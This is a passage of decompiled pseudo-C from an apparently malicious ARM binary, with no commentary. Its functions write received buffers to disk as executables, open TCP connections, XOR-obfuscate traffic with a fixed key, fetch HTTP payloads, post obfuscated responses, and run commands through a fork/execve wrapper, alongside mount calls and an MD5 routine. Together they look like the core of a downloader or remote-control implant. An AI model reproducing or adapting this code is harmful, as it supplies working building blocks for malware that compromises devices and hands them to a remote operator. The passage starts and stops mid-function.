  iVar3 = mount(__s,pcVar2,*(char **)(&stack0xfffffff8 + iVar1),uVar5 | 0x420,(void *)*puVar10);
  bVar11 = iVar3 == 0;
LAB_0001220c:
  fclose(__stream);
  goto LAB_000121f4;
}


/* === write_buffer_as_executable @ 0001225c === */

undefined8 write_buffer_as_executable(void *param_1,size_t param_2,char *param_3)

{
  FILE *__s;
  size_t sVar1;
  int iVar2;
  uint uVar3;
  
  unlink(param_3);
  __s = fopen(param_3,(char *)(DAT_000122a8 + 0x12272));
  uVar3 = 0;
  if (__s != (FILE *)0x0) {
    sVar1 = fwrite(param_1,1,param_2,__s);
    uVar3 = 0;
    if (sVar1 == param_2) {
      iVar2 = chmod(param_3,DAT_000122ac);
      uVar3 = (uint)(iVar2 == 0);
    }
    fclose(__s);
  }
  return CONCAT44(param_1,uVar3);
}


/* === file_exists @ 000122b0 === */

bool file_exists(char *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  int iVar2;
  int *piVar3;
  bool bVar4;
  stat sStack_78;
  
  *param_2 = 0;
  memset(&sStack_78,0,0x68);
  puVar1 = (undefined4 *)__errno();
  *puVar1 = 0;
  iVar2 = stat(param_1,&sStack_78);
  if (iVar2 == 0) {
    bVar4 = true;
    *param_2 = 1;
  }
  else {
    piVar3 = (int *)__errno();
    bVar4 = *piVar3 == 2;
  }
  return bVar4;
}


/* === socket_connect @ 000122f0 === */

void socket_connect(int *param_1,char *param_2,uint param_3)

{
  int iVar1;
  int *piVar2;
  bool bVar3;
  sockaddr local_2c;
  int local_1c;
  
  piVar2 = *(int **)(DAT_00012350 + 0x122fc);
  local_1c = *piVar2;
  iVar1 = socket(2,1,0);
  bVar3 = false;
  *param_1 = iVar1;
  if (0 < iVar1) {
    local_2c.sa_family = 2;
    local_2c.sa_data._0_2_ = (ushort)(param_3 >> 8) & 0xff | (ushort)((param_3 & 0xffff) << 8);
    local_2c.sa_data._2_4_ = inet_addr(param_2);
    iVar1 = connect(*param_1,&local_2c,0x10);
    bVar3 = iVar1 == 0;
  }
  if (local_1c != *piVar2) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(bVar3);
  }
  return;
}


/* === socket_disconnect @ 00012354 === */

undefined4 socket_disconnect(int *param_1)

{
  if (0 < *param_1) {
    close(*param_1);
  }
  *param_1 = 0;
  return 1;
}


/* === do_socket_send @ 0001236a === */

undefined8 do_socket_send(int param_1,int param_2,size_t param_3,int param_4)

{
  void *__ptr;
  ssize_t sVar1;
  byte bVar2;
  int iVar3;
  undefined4 uVar4;
  size_t __n;
  
  uVar4 = 0;
  if ((0 < param_1) && (__ptr = malloc(param_3), uVar4 = 0, __ptr != (void *)0x0)) {
    bVar2 = 0xad;
    if (param_4 == 0) {
      bVar2 = 0;
    }
    for (iVar3 = 0; iVar3 < (int)param_3; iVar3 = iVar3 + 1) {
      *(byte *)((int)__ptr + iVar3) = *(byte *)(param_2 + iVar3) ^ bVar2;
    }
    iVar3 = 0;
    __n = param_3;
    do {
      sVar1 = send(param_1,(void *)((int)__ptr + (param_3 - __n)),__n,0);
      if (sVar1 < 0) {
        uVar4 = 0;
        goto LAB_000123d6;
      }
      if (sVar1 == 0) {
        iVar3 = iVar3 + 1;
        if (99 < iVar3) {
          uVar4 = 0;
          goto LAB_000123d6;
        }
      }
      else {
        iVar3 = 0;
      }
      __n = __n - sVar1;
    } while (0 < (int)__n);
    uVar4 = 1;
LAB_000123d6:
    free(__ptr);
  }
  return CONCAT44(param_1,uVar4);
}


/* === socket_send @ 000123de === */

void socket_send(void)

{
  do_socket_send();
  return;
}


/* === do_socket_receive @ 000123e8 === */

ushort do_socket_receive(int param_1,void *param_2,size_t param_3,int param_4)

{
  undefined4 *puVar1;
  int iVar2;
  ssize_t sVar3;
  ushort uVar4;
  size_t __n;
  int iVar5;
  pollfd local_20;
  
  uVar4 = 0;
  if (0 < param_1) {
    memset(param_2,0,param_3);
    __n = param_3;
    do {
      local_20.events = 1;
      iVar5 = 100;
      local_20.fd = param_1;
      while( true ) {
        puVar1 = (undefined4 *)__errno();
        iVar2 = DAT_00012488;
        *puVar1 = 0;
        iVar2 = poll(&local_20,1,iVar2);
        if ((local_20.revents & 1U) != 0) break;
        iVar5 = iVar5 + -1;
        if (iVar5 == 0) {
          return 0;
        }
        if (iVar2 < 1) {
          return local_20.revents & 1;
        }
      }
      puVar1 = (undefined4 *)__errno();
      *puVar1 = 0;
      sVar3 = recv(local_20.fd,(void *)((int)param_2 + (param_3 - __n)),__n,0);
      if (sVar3 < 1) {
        return 0;
      }
      __n = __n - sVar3;
    } while (0 < (int)__n);
    iVar5 = 0;
    if (param_4 != 0) {
      for (; iVar5 < (int)param_3; iVar5 = iVar5 + 1) {
        *(byte *)((int)param_2 + iVar5) = *(byte *)((int)param_2 + iVar5) ^ 0xad;
      }
    }
    uVar4 = 1;
  }
  return uVar4;
}


/* === socket_receive @ 0001248c === */

void socket_receive(void)

{
  do_socket_receive();
  return;
}


/* === xpopen @ 00012498 === */

FILE * xpopen(char *param_1,char **param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int iVar3;
  __pid_t _Var4;
  FILE *pFVar5;
  undefined4 uVar6;
  pthread_rwlock_t *__rwlock;
  int local_20;
  int local_1c;
  
  puVar2 = malloc(0xc);
  if (puVar2 != (undefined4 *)0x0) {
    iVar3 = pipe(&local_20);
    iVar1 = DAT_00012564;
    if (-1 < iVar3) {
      __rwlock = (pthread_rwlock_t *)(DAT_00012564 + 0x124bc);
      pthread_rwlock_rdlock(__rwlock);
      _Var4 = fork();
      if (_Var4 != -1) {
        if (_Var4 == 0) {
          for (puVar2 = *(undefined4 **)(iVar1 + 0x124e4); puVar2 != (undefined4 *)0x0;
              puVar2 = (undefined4 *)*puVar2) {
            close((int)*(short *)(puVar2[1] + 0xe));
          }
          close(local_20);
          if (local_1c != 1) {
            dup2(local_1c,1);
            close(local_1c);
          }
          execve(param_1,param_2,(char **)**(undefined4 **)(DAT_00012568 + 0x12522));
                    /* WARNING: Subroutine does not return */
          _exit(0x7f);
        }
        pFVar5 = fdopen(local_20,(char *)(DAT_0001256c + 0x12536));
        close(local_1c);
        uVar6 = *(undefined4 *)(iVar1 + 0x124e4);
        puVar2[1] = pFVar5;
        puVar2[2] = _Var4;
        *puVar2 = uVar6;
        *(undefined4 **)(iVar1 + 0x124e4) = puVar2;
        pthread_rwlock_unlock(__rwlock);
        return pFVar5;
      }
      pthread_rwlock_unlock(__rwlock);
      close(local_20);
      close(local_1c);
    }
    free(puVar2);
  }
  return (FILE *)0x0;
}


/* === xpclose @ 00012570 === */

undefined8 xpclose(FILE *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  __pid_t _Var3;
  int *piVar4;
  undefined4 *__ptr;
  undefined4 *puVar5;
  int local_14;
  
  iVar1 = DAT_000125ec;
  local_14 = 0;
  pthread_rwlock_wrlock((pthread_rwlock_t *)(DAT_000125ec + 0x1257c));
  puVar2 = *(undefined4 **)(iVar1 + 0x125a4);
  puVar5 = (undefined4 *)0x0;
  while (__ptr = puVar2, __ptr != (undefined4 *)0x0) {
    if ((FILE *)__ptr[1] == param_1) {
      fclose(param_1);
      if (puVar5 == (undefined4 *)0x0) {
        *(undefined4 *)(DAT_000125f0 + 0x125d0) = *__ptr;
      }
      else {
        *puVar5 = *__ptr;
      }
      pthread_rwlock_unlock((pthread_rwlock_t *)(DAT_000125f4 + 0x125b2));
      goto LAB_000125b4;
    }
    puVar5 = __ptr;
    puVar2 = (undefined4 *)*__ptr;
  }
  pthread_rwlock_unlock((pthread_rwlock_t *)(DAT_000125f8 + 0x125e4));
  _Var3 = -1;
  goto LAB_000125dc;
  while (piVar4 = (int *)__errno(), *piVar4 == 4) {
LAB_000125b4:
    _Var3 = waitpid(__ptr[2],&local_14,0);
    if (_Var3 != -1) break;
  }
  free(__ptr);
  if (_Var3 != -1) {
    _Var3 = local_14;
  }
LAB_000125dc:
  return CONCAT44(param_1,_Var3);
}


/* === http_get_string_attribute @ 000125fc === */

undefined8
http_get_string_attribute(void *param_1,size_t param_2,char *param_3,void *param_4,int param_5)

{
  size_t __needlelen;
  void *__haystack;
  void *pvVar1;
  undefined4 uVar2;
  size_t __n;
  
  __needlelen = strlen(param_3);
  __haystack = memmem(param_1,param_2,param_3,__needlelen);
  uVar2 = 0;
  if ((__haystack != (void *)0x0) &&
     (pvVar1 = memmem(__haystack,(int)param_1 + (param_2 - (int)__haystack),
                      (void *)(DAT_00012658 + 0x1262c),2), uVar2 = 0, pvVar1 != (void *)0x0)) {
    __n = (int)pvVar1 + (-__needlelen - (int)__haystack);
    uVar2 = 0;
    if ((int)__n < param_5) {
      memcpy(param_4,(void *)((int)__haystack + __needlelen),__n);
      *(undefined1 *)((int)param_4 + __n) = 0;
      uVar2 = 1;
    }
  }
  return CONCAT44(__haystack,uVar2);
}


/* === http_get_int_attribute @ 0001265c === */

void http_get_int_attribute(undefined4 param_1,undefined4 param_2,undefined4 param_3,long *param_4)

{
  int iVar1;
  undefined4 *puVar2;
  long lVar3;
  int *piVar4;
  int *piVar5;
  bool bVar6;
  char acStack_50 [52];
  int local_1c;
  
  piVar5 = *(int **)(DAT_000126c4 + 0x12668);
  local_1c = *piVar5;
  memset(acStack_50,0,0x32);
  iVar1 = http_get_string_attribute(param_1,param_2,param_3,acStack_50,0x32);
  bVar6 = false;
  if (iVar1 == 1) {
    puVar2 = (undefined4 *)__errno();
    *puVar2 = 0;
    lVar3 = strtol(acStack_50,(char **)0x0,10);
    *param_4 = lVar3;
    piVar4 = (int *)__errno();
    bVar6 = *piVar4 == 0;
  }
  if (local_1c != *piVar5) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(bVar6);
  }
  return;
}


/* === http_receive_header @ 000126c8 === */

undefined4 http_receive_header(undefined4 param_1,undefined4 *param_2,int *param_3)

{
  void *pvVar1;
  int iVar2;
  void *pvVar3;
  undefined4 uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int local_30;
  char local_19 [5];
  
  uVar5 = 0;
  local_19[0] = '\0';
  *param_2 = 0;
  *param_3 = 0;
  pvVar1 = malloc(300);
  uVar4 = 0;
  if (pvVar1 != (void *)0x0) {
    local_30 = 1;
    iVar6 = DAT_00012764 + 0x126f8;
    iVar7 = 0;
LAB_000126fa:
    do {
      iVar2 = do_socket_receive(param_1,local_19,1,0);
      if (iVar2 != 1) {
LAB_0001274a:
        free(pvVar1);
        return 0;
      }
      iVar2 = iVar7 + 1;
      pvVar3 = pvVar1;
      if (local_30 * 300 < iVar2) {
        local_30 = local_30 + 1;
        pvVar3 = realloc(pvVar1,local_30 * 300);
        if (pvVar3 == (void *)0x0) goto LAB_0001274a;
      }
      *(char *)((int)pvVar3 + iVar7) = local_19[0];
      pvVar1 = pvVar3;
      iVar7 = iVar2;
      if (*(char *)(iVar6 + uVar5) != local_19[0]) {
        uVar5 = 0;
        goto LAB_000126fa;
      }
      uVar5 = uVar5 + 1;
    } while (uVar5 < 4);
    uVar4 = 1;
    *param_3 = iVar2;
    *param_2 = pvVar3;
  }
  return uVar4;
}


/* === http_receive_payload @ 00012768 === */

uint http_receive_payload(undefined4 param_1,undefined4 *param_2,size_t *param_3)

{
  int iVar1;
  void *__ptr;
  uint uVar2;
  void *local_24;
  undefined4 local_20;
  size_t local_1c [2];
  
  *param_2 = 0;
  *param_3 = 0;
  local_24 = (void *)0x0;
  local_20 = 0;
  local_1c[0] = 0;
  iVar1 = http_receive_header(param_1,&local_24,&local_20);
  if ((iVar1 == 1) &&
     (iVar1 = http_get_int_attribute(local_24,local_20,DAT_000127f0 + 0x12794,local_1c), iVar1 == 1)
     ) {
    __ptr = malloc(local_1c[0]);
    uVar2 = 0;
    if (__ptr != (void *)0x0) {
      uVar2 = do_socket_receive(param_1,__ptr,local_1c[0],0);
      uVar2 = -(uint)(uVar2 == 1) & uVar2;
    }
  }
  else {
    __ptr = (void *)0x0;
    uVar2 = 0;
  }
  if (local_24 != (void *)0x0) {
    free(local_24);
  }
  if (uVar2 == 0) {
    if (__ptr != (void *)0x0) {
      free(__ptr);
    }
  }
  else {
    *param_2 = __ptr;
    *param_3 = local_1c[0];
  }
  return uVar2;
}


/* === http_send_request_with_get @ 000127f4 === */

void http_send_request_with_get
               (undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  size_t sVar1;
  int iVar2;
  int *piVar3;
  char acStack_148 [300];
  int local_1c;
  
  piVar3 = *(int **)(DAT_00012854 + 0x12800);
  local_1c = *piVar3;
  memset(acStack_148,0,300);
  snprintf(acStack_148,300,(char *)(DAT_00012858 + 0x12820),param_1,param_2,param_3);
  sVar1 = strlen(acStack_148);
  iVar2 = do_socket_send(param_4,acStack_148,sVar1,0);
  if (local_1c != *piVar3) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(iVar2 == 1);
  }
  return;
}


/* === http_send_response_with_post @ 0001285c === */

void http_send_response_with_post
               (undefined4 param_1,undefined4 param_2,undefined4 param_3,void *param_4,
               size_t param_5,undefined4 param_6)

{
  size_t __n;
  void *__dest;
  int iVar1;
  int *piVar2;
  void *__dest_00;
  bool bVar3;
  char acStack_148 [300];
  int local_1c;
  
  piVar2 = *(int **)(DAT_00012900 + 0x12868);
  local_1c = *piVar2;
  memset(acStack_148,0,300);
  __n = snprintf(acStack_148,300,(char *)(DAT_00012904 + 0x1288a),param_1,param_2,param_5,param_3);
  __dest = malloc(__n + param_5);
  bVar3 = false;
  if (__dest != (void *)0x0) {
    __dest_00 = (void *)((int)__dest + __n);
    memcpy(__dest,acStack_148,__n);
    memcpy(__dest_00,param_4,param_5);
    for (iVar1 = 0; iVar1 < (int)param_5; iVar1 = iVar1 + 1) {
      *(byte *)((int)__dest_00 + iVar1) = *(byte *)((int)__dest_00 + iVar1) ^ 0xad;
    }
    iVar1 = do_socket_send(param_6,__dest,__n + param_5,0);
    bVar3 = iVar1 == 1;
    free(__dest);
  }
  if (local_1c != *piVar2) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(bVar3);
  }
  return;
}


/* === FUN_00012908 @ 00012908 === */

void FUN_00012908(uint *param_1,int param_2,int param_3)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  uint uVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  int iVar19;
  int iVar20;
  int iVar21;
  int local_64;
  int local_24;
  
  local_64 = 0;
  local_24 = 0;
  while (local_24 < param_3) {
    iVar5 = *(int *)(param_2 + local_64);
    uVar1 = param_1[3] + DAT_00012d24 + ((*param_1 ^ param_1[1]) & param_1[2] ^ *param_1) + iVar5;
    uVar1 = (uVar1 >> 0x19 | uVar1 * 0x80) + param_1[2];
    iVar9 = param_2 + local_64;
    iVar3 = *(int *)(iVar9 + 4);
    uVar4 = *param_1 + DAT_00012d28 + iVar3 + ((param_1[1] ^ param_1[2]) & uVar1 ^ param_1[1]);
    iVar15 = *(int *)(iVar9 + 8);
    uVar4 = (uVar4 >> 0x14 | uVar4 * 0x1000) + uVar1;
    uVar6 = param_1[1] + DAT_00012d2c + iVar15 + ((param_1[2] ^ uVar1) & uVar4 ^ param_1[2]);
    iVar7 = *(int *)(iVar9 + 0xc);
    uVar6 = (uVar6 >> 0xf | uVar6 * 0x20000) + uVar4;
    uVar8 = param_1[2] + DAT_00012d30 + iVar7 + ((uVar4 ^ uVar1) & uVar6 ^ uVar1);
    iVar16 = *(int *)(iVar9 + 0x10);
    uVar8 = (uVar8 >> 10 | uVar8 * 0x400000) + uVar6;
    uVar1 = uVar1 + iVar16 + DAT_00012d34 + ((uVar6 ^ uVar4) & uVar8 ^ uVar4);
    iVar10 = *(int *)(iVar9 + 0x14);
    uVar1 = (uVar1 >> 0x19 | uVar1 * 0x80) + uVar8;
    uVar4 = uVar4 + iVar10 + DAT_00012d38 + ((uVar8 ^ uVar6) & uVar1 ^ uVar6);
    iVar17 = *(int *)(iVar9 + 0x18);
    uVar4 = (uVar4 >> 0x14 | uVar4 * 0x1000) + uVar1;
    uVar6 = uVar6 + iVar17 + DAT_00012d3c + ((uVar1 ^ uVar8) & uVar4 ^ uVar8);
    iVar11 = *(int *)(iVar9 + 0x1c);
    uVar6 = (uVar6 >> 0xf | uVar6 * 0x20000) + uVar4;
    uVar8 = uVar8 + iVar11 + DAT_00012d40 + ((uVar4 ^ uVar1) & uVar6 ^ uVar1);
    iVar18 = *(int *)(iVar9 + 0x20);
    uVar8 = (uVar8 >> 10 | uVar8 * 0x400000) + uVar6;
    uVar1 = uVar1 + iVar18 + DAT_00012d44 + ((uVar6 ^ uVar4) & uVar8 ^ uVar4);
    iVar12 = *(int *)(iVar9 + 0x24);
    uVar1 = (uVar1 >> 0x19 | uVar1 * 0x80) + uVar8;
    uVar4 = uVar4 + iVar12 + DAT_00012d48 + ((uVar8 ^ uVar6) & uVar1 ^ uVar6);
    iVar19 = *(int *)(iVar9 + 0x28);
    uVar4 = (uVar4 >> 0x14 | uVar4 * 0x1000) + uVar1;
    uVar6 = uVar6 + iVar19 + DAT_00012d4c + ((uVar1 ^ uVar8) & uVar4 ^ uVar8);
    iVar13 = *(int *)(iVar9 + 0x2c);
    uVar6 = (uVar6 >> 0xf | uVar6 * 0x20000) + uVar4;
    uVar8 = uVar8 + iVar13 + DAT_00012d50 + ((uVar4 ^ uVar1) & uVar6 ^ uVar1);
    iVar20 = *(int *)(iVar9 + 0x30);
    uVar8 = (uVar8 >> 10 | uVar8 * 0x400000) + uVar6;
    uVar1 = uVar1 + iVar20 + DAT_00012d54 + ((uVar6 ^ uVar4) & uVar8 ^ uVar4);
    iVar2 = *(int *)(iVar9 + 0x34);
    uVar14 = (uVar1 >> 0x19 | uVar1 * 0x80) + uVar8;
    uVar1 = uVar4 + iVar2 + DAT_00012d58 + ((uVar8 ^ uVar6) & uVar14 ^ uVar6);
    iVar21 = *(int *)(iVar9 + 0x38);
    uVar1 = (uVar1 >> 0x14 | uVar1 * 0x1000) + uVar14;
    uVar4 = uVar6 + iVar21 + DAT_00012d5c + ((uVar14 ^ uVar8) & uVar1 ^ uVar8);
    iVar9 = *(int *)(iVar9 + 0x3c);
    uVar4 = (uVar4 >> 0xf | uVar4 * 0x20000) + uVar1;
    uVar6 = iVar9 + DAT_00012d60 + uVar8 + ((uVar1 ^ uVar14) & uVar4 ^ uVar14);
    uVar6 = (uVar6 >> 10 | uVar6 * 0x400000) + uVar4;
    uVar8 = iVar3 + DAT_00012d64 + uVar14 + (uVar1 & uVar6 | uVar4 & ~uVar1);
    uVar8 = (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
    uVar1 = iVar17 + DAT_00012d68 + uVar1 + (uVar6 & ~uVar4 | uVar4 & uVar8);
    uVar1 = (uVar1 >> 0x17 | uVar1 * 0x200) + uVar8;
    uVar4 = uVar4 + iVar13 + DAT_00012d6c + (uVar8 & ~uVar6 | uVar6 & uVar1);
    uVar4 = (uVar4 >> 0x12 | uVar4 * 0x4000) + uVar1;
    uVar6 = uVar6 + iVar5 + DAT_00012d70 + (uVar1 & ~uVar8 | uVar8 & uVar4);
    uVar6 = (uVar6 >> 0xc | uVar6 * 0x100000) + uVar4;
    uVar8 = uVar8 + iVar10 + DAT_00012d74 + (uVar4 & ~uVar1 | uVar1 & uVar6);
    uVar8 = (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
    uVar1 = uVar1 + iVar19 + DAT_00012d78 + (uVar6 & ~uVar4 | uVar4 & uVar8);
    uVar1 = (uVar1 >> 0x17 | uVar1 * 0x200) + uVar8;
    uVar4 = uVar4 + iVar9 + DAT_00012d7c + (uVar8 & ~uVar6 | uVar6 & uVar1);
    uVar4 = (uVar4 >> 0x12 | uVar4 * 0x4000) + uVar1;
    uVar6 = uVar6 + iVar16 + DAT_00012d80 + (uVar1 & ~uVar8 | uVar8 & uVar4);
    uVar6 = (uVar6 >> 0xc | uVar6 * 0x100000) + uVar4;
    uVar8 = uVar8 + iVar12 + DAT_00012d84 + (uVar4 & ~uVar1 | uVar1 & uVar6);
    uVar8 = (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
    uVar1 = uVar1 + iVar21 + DAT_00012d88 + (uVar6 & ~uVar4 | uVar4 & uVar8);
    uVar1 = (uVar1 >> 0x17 | uVar1 * 0x200) + uVar8;
    uVar4 = uVar4 + iVar7 + DAT_00012d8c + (uVar8 & ~uVar6 | uVar6 & uVar1);
    uVar4 = (uVar4 >> 0x12 | uVar4 * 0x4000) + uVar1;
    uVar6 = uVar6 + iVar18 + DAT_00012d90 + (uVar1 & ~uVar8 | uVar8 & uVar4);
    uVar6 = (uVar6 >> 0xc | uVar6 * 0x100000) + uVar4;
    uVar8 = uVar8 + iVar2 + DAT_00012d94 + (uVar4 & ~uVar1 | uVar1 & uVar6);
    uVar8 = (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
    uVar1 = uVar1 + iVar15 + DAT_00012d98 + (uVar6 & ~uVar4 | uVar4 & uVar8);
    uVar1 = (uVar1 >> 0x17 | uVar1 * 0x200) + uVar8;
    uVar4 = iVar11 + DAT_00012d9c + uVar4 + (uVar8 & ~uVar6 | uVar6 & uVar1);
    uVar4 = (uVar4 >> 0x12 | uVar4 * 0x4000) + uVar1;
    uVar6 = iVar20 + DAT_00012da0 + uVar6 + (uVar1 & ~uVar8 | uVar8 & uVar4);
    uVar6 = (uVar6 >> 0xc | uVar6 * 0x100000) + uVar4;
    uVar8 = iVar10 + DAT_00012da4 + uVar8 + (uVar4 ^ uVar1 ^ uVar6);
    uVar8 = (uVar8 >> 0x1c | uVar8 * 0x10) + uVar6;
    uVar1 = iVar18 + DAT_00012da8 + uVar1 + (uVar6 ^ uVar4 ^ uVar8);
    uVar1 = (uVar1 >> 0x15 | uVar1 * 0x800) + uVar8;
    uVar4 = iVar13 + DAT_00012dac + uVar4 + (uVar8 ^ uVar6 ^ uVar1);
    uVar4 = (uVar4 >> 0x10 | uVar4 * 0x10000) + uVar1;
    uVar6 = iVar21 + DAT_00012db0 + uVar6 + (uVar1 ^ uVar8 ^ uVar4);
    uVar6 = (uVar6 >> 9 | uVar6 * 0x800000) + uVar4;
    uVar8 = (uVar4 ^ uVar1 ^ uVar6) + iVar3 + DAT_00012db4 + uVar8;
    uVar8 = (uVar8 >> 0x1c | uVar8 * 0x10) + uVar6;
    uVar1 = (uVar6 ^ uVar4 ^ uVar8) + iVar16 + DAT_00012db8 + uVar1;
    uVar1 = (uVar1 >> 0x15 | uVar1 * 0x800) + uVar8;
    uVar4 = (uVar8 ^ uVar6 ^ uVar1) + iVar11 + DAT_00013040 + uVar4;
    uVar4 = (uVar4 >> 0x10 | uVar4 * 0x10000) + uVar1;
    uVar6 = (uVar1 ^ uVar8 ^ uVar4) + iVar19 + DAT_00013044 + uVar6;
    uVar6 = (uVar6 >> 9 | uVar6 * 0x800000) + uVar4;
    uVar8 = (uVar4 ^ uVar1 ^ uVar6) + iVar2 + DAT_00013048 + uVar8;
    uVar8 = (uVar8 >> 0x1c | uVar8 * 0x10) + uVar6;
    uVar1 = (uVar6 ^ uVar4 ^ uVar8) + iVar5 + DAT_0001304c + uVar1;
    uVar1 = (uVar1 >> 0x15 | uVar1 * 0x800) + uVar8;
    uVar4 = (uVar8 ^ uVar6 ^ uVar1) + iVar7 + DAT_00013050 + uVar4;
    uVar4 = (uVar4 >> 0x10 | uVar4 * 0x10000) + uVar1;
    uVar6 = (uVar1 ^ uVar8 ^ uVar4) + iVar17 + DAT_00013054 + uVar6;
    uVar6 = (uVar6 >> 9 | uVar6 * 0x800000) + uVar4;
    uVar8 = (uVar4 ^ uVar1 ^ uVar6) + iVar12 + DAT_00013058 + uVar8;
    uVar8 = (uVar8 >> 0x1c | uVar8 * 0x10) + uVar6;
    uVar1 = (uVar6 ^ uVar4 ^ uVar8) + iVar20 + DAT_0001305c + uVar1;
    uVar1 = (uVar1 >> 0x15 | uVar1 * 0x800) + uVar8;
    uVar4 = uVar4 + iVar9 + DAT_00013060 + (uVar8 ^ uVar6 ^ uVar1);
    uVar4 = (uVar4 >> 0x10 | uVar4 * 0x10000) + uVar1;
    uVar6 = uVar6 + iVar15 + DAT_00013064 + (uVar1 ^ uVar8 ^ uVar4);
    uVar6 = (uVar6 >> 9 | uVar6 * 0x800000) + uVar4;
    uVar8 = iVar5 + DAT_00013068 + uVar8 + ((~uVar1 | uVar6) ^ uVar4);
    uVar14 = (uVar8 >> 0x1a | uVar8 * 0x40) + uVar6;
    uVar1 = iVar11 + DAT_0001306c + uVar1 + ((~uVar4 | uVar14) ^ uVar6);
    uVar1 = (uVar1 >> 0x16 | uVar1 * 0x400) + uVar14;
    uVar4 = iVar21 + DAT_00013070 + uVar4 + ((~uVar6 | uVar1) ^ uVar14);
    uVar8 = (uVar4 >> 0x11 | uVar4 * 0x8000) + uVar1;
    uVar4 = uVar6 + iVar10 + DAT_00013074 + ((~uVar14 | uVar8) ^ uVar1);
    uVar4 = (uVar4 >> 0xb | uVar4 * 0x200000) + uVar8;
    uVar6 = iVar20 + DAT_00013078 + uVar14 + ((~uVar1 | uVar4) ^ uVar8);
    uVar14 = (uVar6 >> 0x1a | uVar6 * 0x40) + uVar4;
    uVar1 = iVar7 + DAT_0001307c + uVar1 + ((~uVar8 | uVar14) ^ uVar4);
    uVar1 = (uVar1 >> 0x16 | uVar1 * 0x400) + uVar14;
    uVar6 = iVar19 + DAT_00013080 + uVar8 + ((~uVar4 | uVar1) ^ uVar14);
    uVar8 = (uVar6 >> 0x11 | uVar6 * 0x8000) + uVar1;
    uVar4 = iVar3 + DAT_00013084 + uVar4 + ((~uVar14 | uVar8) ^ uVar1);
    uVar6 = (uVar4 >> 0xb | uVar4 * 0x200000) + uVar8;
    uVar4 = iVar18 + DAT_00013088 + uVar14 + ((~uVar1 | uVar6) ^ uVar8);
    uVar4 = (uVar4 >> 0x1a | uVar4 * 0x40) + uVar6;
    uVar1 = iVar9 + DAT_0001308c + uVar1 + ((~uVar8 | uVar4) ^ uVar6);
    uVar1 = (uVar1 >> 0x16 | uVar1 * 0x400) + uVar4;
    uVar8 = iVar17 + DAT_00013090 + uVar8 + ((~uVar6 | uVar1) ^ uVar4);
    uVar8 = (uVar8 >> 0x11 | uVar8 * 0x8000) + uVar1;
    uVar6 = iVar2 + DAT_00013094 + uVar6 + ((~uVar4 | uVar8) ^ uVar1);
    uVar6 = (uVar6 >> 0xb | uVar6 * 0x200000) + uVar8;
    uVar4 = iVar16 + DAT_00013098 + uVar4 + ((~uVar1 | uVar6) ^ uVar8);
    uVar4 = (uVar4 >> 0x1a | uVar4 * 0x40) + uVar6;
    uVar1 = iVar13 + DAT_0001309c + uVar1 + ((~uVar8 | uVar4) ^ uVar6);
    uVar1 = (uVar1 >> 0x16 | uVar1 * 0x400) + uVar4;
    uVar8 = iVar15 + DAT_000130a0 + uVar8 + ((~uVar6 | uVar1) ^ uVar4);
    uVar8 = (uVar8 >> 0x11 | uVar8 * 0x8000) + uVar1;
    iVar12 = iVar12 + DAT_000130a4;
    *param_1 = uVar1 + *param_1;
    param_1[1] = uVar8 + param_1[1];
    uVar1 = iVar12 + uVar6 + ((uVar8 | ~uVar4) ^ uVar1);
    param_1[3] = uVar4 + param_1[3];
    local_24 = local_24 + 1;
    local_64 = local_64 + 0x40;
    param_1[2] = uVar8 + param_1[2] + (uVar1 >> 0xb | uVar1 * 0x200000);
  }
  return;
}


/* === av_md5_init @ 000130a8 === */

void av_md5_init(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[0x12] = DAT_000130c4;
  param_1[0x13] = DAT_000130c8;
  param_1[0x14] = DAT_000130cc;
  param_1[0x15] = DAT_000130d0;
  return;
}


/* === av_md5_update @ 000130d4 === */

undefined8 av_md5_update(uint *param_1,void *param_2,uint param_3)

{
  uint uVar1;
  void *local_1c;
  
  uVar1 = *param_1;
  local_1c = (void *)(uVar1 & 0x3f);
  *param_1 = param_3 + uVar1;
  param_1[1] = ((int)param_3 >> 0x1f) + param_1[1] + (uint)CARRY4(param_3,uVar1);
  if (local_1c != (void *)0x0) {
    uVar1 = param_3;
    if ((int)(0x40U - (int)local_1c) < (int)param_3) {
      uVar1 = 0x40U - (int)local_1c;
    }
    memcpy((void *)((int)param_1 + (int)local_1c + 8U),param_2,uVar1);
    if ((int)((int)local_1c + uVar1) < 0x40) goto LAB_00013186;
    param_2 = (void *)((int)param_2 + uVar1);
    param_3 = param_3 - uVar1;
    FUN_00012908(param_1 + 0x12,param_1 + 2,1);
  }
  local_1c = (void *)((int)param_2 + (param_3 & 0xffffffc0));
  if (((uint)param_2 & 3) == 0) {
    FUN_00012908(param_1 + 0x12,param_2,(int)(((uint)((int)param_3 >> 0x1f) >> 0x1a) + param_3) >> 6
                );
    param_2 = local_1c;
  }
  else {
    for (; param_2 < local_1c; param_2 = (void *)((int)param_2 + 0x40)) {
      memcpy(param_1 + 2,param_2,0x40);
      FUN_00012908(param_1 + 0x12,param_1 + 2,1);
    }
  }
  if ((param_3 & 0x3f) != 0) {
    memcpy(param_1 + 2,param_2,param_3 & 0x3f);
  }
LAB_00013186:
  return CONCAT44(local_1c,param_1);
}


/* === av_md5_final @ 00013188 === */

undefined8 av_md5_final(uint *param_1,undefined1 *param_2)

{
  undefined4 uVar1;
  int iVar2;
  int local_18;
  uint local_14;
  
  local_14 = param_1[1] << 3 | *param_1 >> 0x1d;
  local_18 = *param_1 << 3;
  iVar2 = DAT_000131f0 + 0x131aa;
  av_md5_update(param_1,DAT_000131ec + 0x131a2,1);
